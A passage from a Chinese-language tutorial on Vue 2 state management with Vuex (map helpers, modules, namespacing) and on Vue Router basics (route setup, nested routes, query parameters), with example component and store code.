"./mutation-types";\n\nvue.use(vuex)\n\nexport default new vuex.store({\n    state: { sum: 0, name: \'张三\', age: 18 },\n    getters: {\n        smallsum: state => state.sum - 10,\n        middlesum: state => state.sum + 10,\n        bigsum: state => state.sum * 10,\n    },\n    actions: {},\n    mutations: {\n        [count_add](state, value) {\n            state.sum += value;\n        },\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n未经过mapstate和mapgetters优化的count.vue：\n\n<template>\n  <div>\n    <h2>{{ msg }}，{{ na }}，你的年龄是{{ ag }}吗？</h2>\n    <h2>当前的和值为：{{ he }}</h2>\n    <h2>当前和值减少后为：{{ smlsum }}</h2>\n    <h2>当前和值增大后为：{{ midsum }}</h2>\n    <h2>当前和值翻倍后为：{{ bisum }}</h2>\n    <button @click="increment">加1</button>\n  </div>\n</template>\n\n<script>\nimport { count_add } from "../store/mutation-types";\nexport default {\n  name: "count",\n  data() {\n    return { msg: "你好呀" };\n  },\n  computed: {\n    // 拿取store里的state数据，作为本组件的计算属性。并且还不能使用箭头函数进行简写\n    he() { return this.$store.state.sum },\n    na() { return this.$store.state.name },\n    ag() { return this.$store.state.age },\n    // 拿取store里的getters属性，作为本组件的计算属性\n    smlsum() { return this.$store.getters.smallsum },\n    midsum() { return this.$store.getters.middlesum },\n    bisum() { return this.$store.getters.bigsum },\n  },\n  methods: {\n    increment() { this.$store.commit(count_add, 1) },\n  },\n};\n<\/script>\n\n<style>\nbutton { margin-left: 5px; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n经过mapstate和mapgetters优化过的count.vue：\n\n<template>\n  <div>\n    <h2>{{ msg }}，{{ na }}，你的年龄是{{ ag }}吗？</h2>\n    <h2>当前的和值为：{{ he }}</h2>\n    <h2>当前和值减少后为：{{ smlsum }}</h2>\n    <h2>当前和值增大后为：{{ midsum }}</h2>\n    <h2>当前和值翻倍后为：{{ bisum }}</h2>\n    <button @click="increment">加1</button>\n  </div>\n</template>\n\n<script>\nimport { mapstate, mapgetters } from "vuex";\nimport { count_add } from "../store/mutation-types";\nexport default {\n  name: "count",\n  data() {\n    return { msg: "你好呀" };\n  },\n  computed: {\n    // mapstate和mapgetters的入参是个对象，如果state数据与组件计算属性不同名，就使用对象形式；如果同名就使用数组形式。\n    // mapstate和mapgetters的返回值是一个对象，必须使用`...`展开符将该对象属性合并到本组件的计算属性里\n    ...mapstate({ \n      he: "sum",            // 将`he`映射为`this.$store.state.sum`\n      na: "name",           // 将`na`映射为`this.$store.state.name`\n      ag: "age"             // 将`ag`映射为`this.$store.state.age`\n      }),\n    ...mapgetters({\n      smlsum: "smallsum",   // 将`smlsum`映射为`this.$store.getters.smallsum`\n      midsum: "middlesum",  // 将`midsum`映射为`this.$store.getters.middlesum`\n      bisum: "bigsum"       // 将`bisum`映射为`this.$store.getters.bigsum`\n      }),\n    // ...mapstate(["sum", "name", "age" ]), // 两边同名，可避免取名的烦恼。同名要以state里的变量名为主导\n    // ...mapgetters(["smallsum", "middlesum", "bigsum" ]), // 两边同名，可避免取名的烦恼\n  },\n  methods: {\n    increment() {\n      this.$store.commit(count_add, 1);\n    },\n  },\n};\n<\/script>\n\n<style>\nbutton { margin-left: 5px; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\nmapactions和mapmutations其实和上面的mapstate和mapgetters类似。mapactions用于快速在本组件里生成与actions里对应的方法调用，mapmutations用于快速在本组件里生成与mutations里对应的方法调用。\n\n它们生成的东西都放在methods里。如果你要使用它们生成的方法，在传参的时候非常值得注意，如果是在模板中使用那就必须得手动带上参数。\n\n我们把2.3 vuex的基本使用的例子经过mapactions和mapmutations的优化，代码如下：\n\n<template>\n  <div>\n    \x3c!-- 使用共享数据sum --\x3e\n    <h2>当前和为：{{ $store.state.sum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    \x3c!-- 因为使用mapmutations和mapactions，在模板中必须手动传参 --\x3e\n    <button @click="increment(num)">加{{ num }}</button>\n    <button @click="decrement(num)">减{{ num }}</button>\n    <button @click="incrementodd(num)">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementwait(num)">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nimport { mapactions, mapmutations } from "vuex";\nimport { addwait, addodd } from "../store/actions-types";\nimport { count_add, count_subtract } from "../store/mutation-types";\nexport default {\n  name: "count",\n  data() {\n    return { num: 1 };\n  },\n  methods: {\n    ...mapmutations({\n      // 将`increment`映射为`this.$store.commit(count_add)`，注意没有带上参数，必须在模板中手动添加入参\n      increment: count_add,\n      // 将`increment`映射为`this.$store.commit(count_add)`，注意没有带上参数，必须在模板中手动添加入参\n      decrement: count_subtract,\n    }),\n    ...mapactions({\n      // 将`incrementodd`映射为`this.$store.dispatch(addodd)`，注意没有带上参数，必须在模板中手动添加入参\n      incrementodd: addodd,\n      // 将`incrementwait`映射为`this.$store.dispatch(addwait)`，注意没有带上参数，必须在模板中手动添加入参\n      incrementwait: addwait,\n    }),\n  },\n};\n<\/script>\n\n<style>\nbutton { margin-left: 5px; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 2.6 vuex模块化\n\n我们不可能将所有业务的共享数据以及方法都放在一个store文件里，这会特别臃肿特别混乱导致难以维护，我们可以按照业务模块或功能对store进行拆分，将他们拆分成一个个模块，每个模块拥有自己的state、mutations、actions、getters（模块内还能嵌套）。\n\n// 拆分成一个模块a\nconst modulea = {\n  state: () => ({ ... }),\n  mutations: { ... },\n  actions: { ... },\n  getters: { ... }\n}\n// 拆分成一个模块b\nconst moduleb = {\n  state: () => ({ ... }),\n  mutations: { ... },\n  actions: { ... }\n}\nconst store = new vuex.store({\n  // 使用modules配置项将上面的模块放到store中去\n  modules: {\n    a: modulea,\n    b: moduleb\n  }\n})\nstore.state.a // -> modulea 的状态，注意，不是store.a.state\nstore.state.b // -> moduleb 的状态，注意，不是store.a.state\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n每个模块内的mutations、actions、getters里的方法，它们的形参都是在本模块中是局部的。如果想在方法中访问全局的state和getters，1) getters里的方法的第三和第四形参是rootstate和rootgetters；2) actions里的方法的形参context中有rootstate和rootgetters。\n\nconst modulea = {\n  getters: {\n    // state和getters这两个形参是局部的，rootstate和rootgetters可以访问到根节点的state和getters\n    sumwithrootcount (state, getters, rootstate, rootgetters) {\n      return state.count + rootstate.count\n    }\n  },\n  actions: {\n    // context中有rootstate和`rootgetters，可以访问到根节点的state和getters\n    incrementifoddonrootsum ({ state, commit, rootstate }) {\n      if ((state.count + rootstate.count) % 2 === 1) {\n        commit(\'increment\')\n      }\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n上说的是模块里的方法的形参是在模块内部是局部的。而模块里的state、actions、mutations和getters本身，在默认情况下是注册在全局命名空间的，这使得多个模块能够对同一state、actions、mutations和getters作出响应。\n\n如果想让模块在使用state、actions、mutations和getter时要通过“模块名”来访问，那就可以给模块打开namespaced开关，那么modules的属性名就会作为模块的命名空间了。\n\n下面这个例子，使用了模块化和命名空间，我们要熟悉store在组件内部是怎么使用的。使用mapstate、mapgetters、mapactions、mapmutations写法是最简单的，只需要在形参列表里的第一个位置上加上模块名这个新参数即可；而原始写法就得特别注意了，state是数据，一般this.$store.state.模块名.属性即可，而getters、actions、mutations里是方法，关键部位必须是"模块名/方法名"的形式。\n\nstore/index.js：\n\nimport vue from \'vue\';\nimport vuex from \'vuex\';\nimport countabout from \'./countabout\'\nimport personabout from \'./personabout\'\n\nvue.use(vuex)\n\nexport default new vuex.store({\n    // 使用modules将countstore和personstore放入store\n    modules: {\n        countabout,\n        personabout\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nstore/personabout.js：\n\nimport { changeage } from \'./actions-types\';\nimport { person_change_age, person_change_address } from "./mutation-types";\nexport default {\n    // 开启命名空间\n    namespaced: true,\n    state: { name: "张三", age: 18, address: \'武汉\' },\n    actions: {\n        [changeage](context, value) {\n            settimeout(() => {\n                context.commit(person_change_age, context.state.age + value);\n            }, 1000);\n        }\n    },\n    mutations: {\n        [person_change_age](state, value) {\n            state.age = value;\n        },\n        [person_change_address](state, value) {\n            state.address = value;\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nstore/countabout.js：\n\nimport { addwait, addodd } from \'./actions-types\';\nimport { count_add, count_subtract } from "./mutation-types";\nexport default {\n    // 开启命名空间\n    namespaced: true,\n    state: { sum: 0 },\n    getters: { bigsum: state => state.sum * 10 },\n    actions: {\n        [addwait](context, value) {\n            settimeout(() => {\n                context.commit(count_add, value);\n            }, 1000)\n        },\n        [addodd]({ state, commit }, value) {\n            if (state.sum % 2) commit(count_add, value);\n        }\n    },\n    mutations: {\n        [count_add](state, value) {\n            state.sum += value;\n        },\n        [count_subtract](state, value) {\n            state.sum -= value;\n        },\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nperson.vue：\n\n<template>\n  <div>\n    <h2>count组件里的当前和值是：{{ sum }}，放大十倍后：{{ bigsum }}</h2>\n    <h2>下面是person组件本身的内容：</h2>\n    <h2>姓名：{{ name }}</h2>\n    <h2>年龄：{{ age }}</h2>\n    <h2>住址：{{ address }}</h2>\n    <span>选择几年后：</span>\n    <select v-model.number="years" @change="changeage">\n      <option value="5">5</option>\n      <option value="8">8</option>\n      <option value="12">12</option>\n    </select>\n    <span>搬家：</span>\n    <select v-model="addre" @change="changeaddress">\n      <option value="武汉">武汉</option>\n      <option value="上海">上海</option>\n      <option value="北京">北京</option>\n    </select>\n  </div>\n</template>\n\n<script>\nimport { changeage } from "../store/actions-types";\nimport { person_change_address } from "../store/mutation-types";\nexport default {\n  name: "person",\n  data() {\n    return {\n      years: "",\n      addre: "武汉",\n    };\n  },\n  computed: {\n    name() {\n      // 开启命名空间后，读取state时的原始写法：this.$store.state.模块名.属性名\n      return this.$store.state.personabout.name;\n    },\n    age() {\n      return this.$store.state.personabout.age;\n    },\n    address() {\n      return this.$store.state.personabout.address;\n    },\n    sum() {\n      return this.$store.state.countabout.sum;\n    },\n    bigsum() {\n      // 开启命名空间后，读取getters时的原始写法：this.$store.getters["模块名/属性名"]\n      return this.$store.getters["countabout/bigsum"];\n    },\n  },\n  methods: {\n    changeage() {\n      // 开启命名空间后，使用dispatch时的原始写法：this.$store.dispatch("模块名/方法名", xxx)，xxx是方法的入参\n      this.$store.dispatch(`personabout/${changeage}`, this.years);\n    },\n    changeaddress() {\n      // 开启命名空间后，使用commit时的原始写法：this.$store.commit("模块名/方法名", xxx)，xxx是方法的入参\n      this.$store.commit(`personabout/${person_change_address}`, this.addre);\n    },\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\ncount.vue：\n\n<template>\n  <div>\n    <h2>\n      person组件里的姓名是：{{ name }}，年龄是：{{ age }}，住址是：{{ address }}\n    </h2>\n    <h2>下面是count组件本身的内容：</h2>\n    <h2>当前和为：{{ sum }}</h2>\n    <h2>当前和放大十倍后：{{ bigsum }}</h2>\n    <select v-model.number="num">\n      <option value="1">1</option>\n      <option value="2">2</option>\n      <option value="3">3</option>\n    </select>\n    \x3c!-- 因为使用mapmutations和mapactions，在模板中必须手动传参 --\x3e\n    <button @click="increment(num)">加{{ num }}</button>\n    <button @click="decrement(num)">减{{ num }}</button>\n    <button @click="incrementodd(num)">当前和为奇数时再加{{ num }}</button>\n    <button @click="incrementwait(num)">等一等再加{{ num }}</button>\n  </div>\n</template>\n\n<script>\nimport { mapactions, mapmutations, mapstate, mapgetters } from "vuex";\nimport { addwait, addodd } from "../store/actions-types";\nimport { count_add, count_subtract } from "../store/mutation-types";\nexport default {\n  name: "count",\n  data() {\n    return { num: 1 };\n  },\n  computed: {\n    // 开启命名空间后，读取state时的mapstate写法：...mapstate("模块名", ["属性名"])\n    ...mapstate("countabout", ["sum"]),\n    ...mapstate("personabout", ["name", "age", "address"]),\n    // 开启命名空间后，读取getters时的mapgetters写法：...mapgetters("模块名", ["属性名"])\n    ...mapgetters("countabout", ["bigsum"]),\n  },\n  methods: {\n    // 开启命名空间后，使用dispatch时的mapactions写法：...mapactions("模块名", ["方法名"])\n    //  或者 ...mapactions("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapactions("countabout", {\n      incrementodd: addodd,\n      incrementwait: addwait,\n    }),\n    // 开启命名空间后，使用commit时的mapmutations写法：...mapmutations("模块名", ["方法名"])\n    //  或者 ...mapmutations("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapmutations("countabout", {\n      increment: count_add,\n      decrement: count_subtract,\n    }),\n  },\n};\n<\/script>\n\n<style>\nbutton {\n  margin-left: 5px;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. vuex的模块化+命名空间：让代码更好维护，让多种数据分类更加明确。\n\n 2. 修改store.js（store/index.js）：\n    \n    const countabout = {\n        // 开启命名空间\n        namespaced: true,\n        state: { ... },\n        actions: { ... },\n        mutations: { ... },\n    }\n    const personabout = {\n        // 开启命名空间\n        namespaced: true,\n        state: { ... },\n        actions: { ... },\n        mutations: { ... },\n    }\n    const store = new vuex.store({\n      modules: {\n        countabout,\n        personabout\n      }\n    })\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    \n\n 3. 开启命名空间后，组件中读取state数据：\n    \n    // 方式一：原始写法，this.$store.state.模块名.属性名\n    this.$store.state.personabout.name;\n    // 方式二：借助mapstate的写法，...mapstate("模块名", ["属性名"])\n    ...mapstate("countabout", ["sum"]),\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 开启命名空间后，组件中读取getters数据：\n    \n    // 方式一：原始写法，this.$store.getters["模块名/方法名"]\n    this.$store.getters["personabout/bigsum"]; // bigsum是属性的形式，实际上是个方法\n    // 方式二：借助mapgetters的写法，...mapgetters("模块名", ["方法名"])\n    ...mapstate("countabout", ["bigsum"]),\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. 开启命名空间后，组件中调用dispatch：\n    \n    // 方式一：原始写法，this.$store.dispatch("模块名/方法名", xxx)，xxx是方法的入参\n    this.$store.dispatch(`personabout/${changeage}`, this.years); // years是入参\n    // 方式二：借助mapactions的写法，...mapactions("模块名", ["方法名"])\n    //  或者 ...mapactions("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapactions("countabout", {\n      incrementodd: addodd,  // 这里没有入参，需要在模板使用处手动添加入参\n      incrementwait: addwait,\n    }),\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n 6. 开启命名空间后，组件中调用commit：\n    \n    // 方式一：原始写法，this.$store.commit("模块名/方法名", xxx)，xxx是方法的入参\n    this.$store.commit(`personabout/${person_change_address}`, this.addre); // addre是入参\n    // 方式二：借助mapmutations的写法，...mapmutations("模块名", ["方法名"])\n    //  或者 ...mapmutations("模块名", { "本组件里的方法名": "store里的方法名" })\n    ...mapmutations("countabout", {\n      increment: count_add,  // 这里没有入参，需要在模板使用处手动添加入参\n      decrement: count_subtract,\n    }),\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n----------------------------------------\n\n\n# 三、vue router\n\n路由：从起点到终点这样一个端到端的形式（关系），类似于映射或者key-value。\n\n路由器：管理着多个路由，决定着路由具体是哪个端口到哪个端口，以及如何解析端口等。\n\n单页面应用：也叫spa，它表示应用始终只使用一个html页面进行展示以及与用户的交互，不会重新加载页面也不会跳转到新页面，如果页面需要新数据可以通过ajax技术从服务端获取。即使用户点击了应用中属于应用本身的链接，也只是浏览器里url路径变化了，而页面只是局部进行了重新渲染。spa的好处就是用户无需频繁切换浏览器页签，方便前端开发人员管理页面以及复杂组件的更新。坏处就是代码等资源比较集中那么初始化加载慢，因为内容都随用随取所以seo较差。\n\nweb路由器：前端项目中的路由器，用于决定什么url（端）展示什么模块（组件）。服务器端里的路由器，接收客户端的请求，根据它的请求使用对应的方法（接口）来处理这一次请求。\n\n\n# 3.1 搭建vue router环境\n\nvue router是vue官方提供的路由管理器，和vuex一样也是一个插件。它会配置路由信息，决定url地址展示什么页面，可实现不重新加载整个页面就能局部更新渲染组件（改变内容无需刷新页面）。\n\n先使用npm i vue-router在项目中局部安装vue router，然后在项目根目录下新建router目录，并在该目录下新建index.js文件。用于存放router路由器的相关代码，也是用于集中管理路由。\n\n导入vue和vue router，使用使用vue.use(router)将vue router功能增加到vue上。然后对router进行实例化，传入一个配置对象，该配置对象有一个routers配置，是用来定义路由规则，也就是决定哪个url会对应到哪个组件（端到端的关系）。\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\n\n// 这个同vuex，在实例化之前就将router的功能增加到vue上\nvue.use(router);\n\n// 对router进行实例化，并设置路由规则，url对应着组件\nexport default new router({\n    // 是routes不是routers\n    routes: [{\n      path: \'/xxx\',   // 地址\n      component: xxx, // 组件\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n将导出的router实例放在vue配置对象的名为router属性上，是为了让每个组件都能使用router。main.js代码如下：\n\nimport vue from \'vue\'\nimport app from \'./app.vue\'\nimport router from \'./router/index\'\n\nnew vue({\n  el: \'#app\',\n  render: h => h(app),\n  // 在这里放入router实例，那么每个组件里都能使用`this.$router`访问了\n  router,\n  components: { app },\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 3.2 router的基本使用\n\n我们先在项目的public目录下准备两个html，用于展示多页面项目。将下面两个html放入public目录后，打开http://localhost:8080/home.html，会看到home和about切换按钮以及它们的展示区域，点击它们就可以看到浏览器url变了并且页面重新加载了。\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <title>vue app</title>\n  <style>\n  a { text-decoration: none; }\n  .link { float: left; width: 6%; margin-left: 10%; }\n  .content { float: left; width: 50%; height: 86px;\n    margin-left: 2%; background-color: gray; }\n  .list-item { position: relative; display: block; padding: 10px 15px;\n    background-color: #fff; border: 1px solid #ddd; }\n  .list-item.active { z-index: 2; color: #fff;\n    background-color: #337ab7; border-color: #337ab7; }\n  </style>\n</head>\n<body>\n  <div>\n    <div class="link">\n        <a class="list-item active" href="./home.html">home</a>\n        <a class="list-item" href="./about.html">about</a>\n    </div>\n    <div class="content">\n          <p>我是home的内容，我是home的内容，我是home的内容，我是home的内容</p>\n    </div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n<html lang="en">\n<head>\n  <meta charset="utf-8">\n  <title>vue app</title>\n  <style>\n  a { text-decoration: none; }\n  .link { float: left; width: 6%; margin-left: 10%; }\n  .content { float: left; width: 50%; height: 86px;\n    margin-left: 2%; background-color: gray; }\n  .list-item { position: relative; display: block; padding: 10px 15px;\n    background-color: #fff; border: 1px solid #ddd; }\n  .list-item.active { z-index: 2; color: #fff;\n    background-color: #337ab7; border-color: #337ab7; }\n  </style>\n</head>\n<body>\n  <div>\n    <div class="link">\n        <a class="list-item" href="./home.html">home</a>\n        <a class="list-item active" href="./about.html">about</a>\n    </div>\n    <div class="content">\n          <p>我是about的内容，我是about的内容，我是about的内容，我是about的内容</p>\n    </div>\n  </div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n我们要使用vue + vue router实现同样的功能。在项目的src里新建pages目录，在该目录下新建home.ve和about.vue。然后将主要代码放入app.vue里，重点来了，把home\\about这两个<a>标签换成router-link来替代点击修改url的功能，再将展示区的<p>标签换成<router-view>>来替代展示功能，当url变化时不会重新加载页面，只会让展示区重新渲染。最后打开http://localhost:8080/home进行验证。代码如下：\n\nrouter/index.js：\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\n\nvue.use(router);\n\nexport default new router({\n    // 将home和about加到路由里，并设置让它们展示的url地址\n    routes: [{\n        path: \'/home\',      // url地址 端\n        component: home     // 展示组件 端\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\napp.vue：\n\n<template>\n  <div class="outer">\n    <div class="link">\n      \x3c!-- <a class="list-item" href="./home.html">home</a>\n        <a class="list-item active" href="./about.html">about</a> --\x3e\n      \x3c!-- 使用router-link来替代之前的a标签，to对应着href，active-class对应着active --\x3e\n      <router-link to="/home" active-class class="list-item">home</router-link>\n      <router-link to="/about" class="list-item">about</router-link>\n    </div>\n    <div class="content">\n      \x3c!-- <p>我是about的内容，我是about的内容，我是about的内容，我是about的内容</p> --\x3e\n      \x3c!-- 使用router-view来替代之前的p，其实就是组件展示（端到端，这是展示端） --\x3e\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "app",\n};\n<\/script>\n<style>\n.outer { display: flex; }\n.link { \n  display: flex; flex-direction: column;\n  margin-left: 16%;\n}\n.content {\n  margin-left: 10px; padding: 20px;\n  background-color: darkgrey;\n}\n.list-item {\n  margin-bottom: 10px; padding: 10px 15px;\n  background-color: #fff; border: 1px solid #ddd;\n}\n.list-item.active,\n.list-item.router-link-exact-active {\n  z-index: 2; color: #fff;\n  background-color: #337ab7;\n  border-color: #337ab7;\n}\na { text-decoration: none; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\npages/home.vue：\n\n<template>\n  <p>\n    vue组件home：我是home的内容，我是home的内容，我是home的内容，我是home的内容\n  </p>\n</template>\n\n<script>\nexport default {\n  name: "home",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\npages/about.vue：\n\n<template>\n  <p>\n    vue组件about：我是about的内容，我是about的内容，我是about的内容，我是about的内容\n  </p>\n</template>\n\n<script>\nexport default {\n  name: "about",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n有两个注意点：\n\n * 路由进行切换的时候，上一个组件默认会被销毁（可以手动设置不被销毁），新的组件会生成并渲染到页面中。\n\n * 路由组件的实例上有$route和$router，其中$route是当前组件的对应的路由规则信息，$router就是项目中唯一的一个路由器（与vuex一样，唯一的一个$store）。\n\n\n# 3.3 嵌套路由和query传参\n\n嵌套路由也叫多级路由，在一个路由组件中还有一层路由，一般最多套五层。\n\n只需要把router/index.js里的某级路由里添加一个children属性，这个children里就是当前路由的子级路由，仍然要给它配置path和component。要注意的是子级路由的path，不要带上/，也不要写上完整路径（不要path: "/父级/子级"，也不要path: "/子级"），因为vue router会自动帮你补齐，最终的写法只需要path: "子级"这种形式即可。\n\nroutes: [{\n    path: \'/home\',          // 一级路由\n    component: home,\n    children: [{            // 二级路由\n        path: \'news\',       // 不要带上`/`，也不要写\'/home/news\'\n        component: news,\n    }, {\n        path: \'message\',    // 不要带上`/`，也不要写\'/home/message\'\n        component: message,\n    }]\n}, {\n    path: \'/about\',         // 一级路由\n    component: about\n}]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n然后在那个对应路由组件内部使用<router-link>和<router-view>。特别注意，to属性要写上完整的路径，这个vue router帮你补不齐，所以最终写法是to="/父级/子级"。\n\n\x3c!-- to写上完整路径 --\x3e\n<router-link active-class to="/home/news" class="list-item">news</router-link>\n\n\n1\n2\n\n\n相关完整代码如下：\n\nrouter/index.js：\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\n\nvue.use(router);\n\nexport default new router({\n    routes: [{\n        path: \'/home\',       // url 端\n        component: home,     // 展示 端\n        children: [{         // 子级路由（当前是二级路由）\n            path: \'news\',    // 不要带上`/`\n            component: news,\n        }, {\n            path: \'message\',\n            component: message,\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nhome.vue：\n\n<template>\n  <div>\n    <p>\n      vue组件home：我是home的内容，我是home的内容，我是home的内容，我是home的内容\n    </p>\n    <div>\n      <ul class="nav">\n        <li>\n          \x3c!-- <a class="list-group-item active" href="./home-news.html">news</a> --\x3e\n          \x3c!-- 这里唯一要注意的是to里的路径一定要写完整 --\x3e\n          <router-link active-class to="/home/news" class="list-item"\n            >news</router-link\n          >\n        </li>\n        <li>\n          \x3c!-- <a class="list-group-item" href="./home-message.html">message</a> --\x3e\n          \x3c!-- 这里唯一要注意的是to里的路径一定要写完整 --\x3e\n          <router-link to="/home/message" class="list-item"\n            >message</router-link\n          >\n        </li>\n      </ul>\n      <div class="content-child">\n        \x3c!-- 展示端 --\x3e\n        <router-view></router-view>\n      </div>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "home",\n};\n<\/script>\n\n<style>\n.nav {\n  display: flex;\n  justify-content: flex-start;\n  padding-left: 0;\n  margin-top: 35px;\n  list-style: none;\n}\n.nav > li {\n  width: 100px;\n}\n.content-child {\n  background-color: darkgray;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\nnews.vue：\n\n<template>\n  <ul>\n    <li>news001</li>\n    <li>news002</li>\n    <li>news003</li>\n  </ul>\n</template>\n\n<script>\nexport default {\n  name: "news",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nmessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li>\n        <a href="http://localhost:8080/#/home/message">message001</a\n        >&nbsp;&nbsp;\n      </li>\n      <li>\n        <a href="http://localhost:8080/#/home/message">message002</a\n        >&nbsp;&nbsp;\n      </li>\n      <li>\n        <a href="http://localhost:8080/#/home/message">message003</a\n        >&nbsp;&nbsp;\n      </li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "message",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n现在有个需求，点击message组件里的每条信息，在下面展示对应的id和tittle。可以给message的每条信息弄个路由跳转<router-link>，只不过路由展示只需要一个组件，我们在路由跳转时进行一个query传参即可，然后在这个新组件展示时使用this.$route.query进行接收参数。\n\n具体是在<router-link>的to属性里的路由链接后追加?xxx=yyy&www=zzz这种传参，另一种比较方便的写法是，使用to的对象形式：\n\n// 写法一\n:to="`/home/message/detail?id=${item.id}&title=${item.title}`"\n// 写法二\n:to="{\n  path: \'/home/message/detail\', // 路由地址\n  query: {                      // query传参，它是个对象，里面一组组key-value\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n需求实现代码如下：\n\nrouter/index.js：\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from 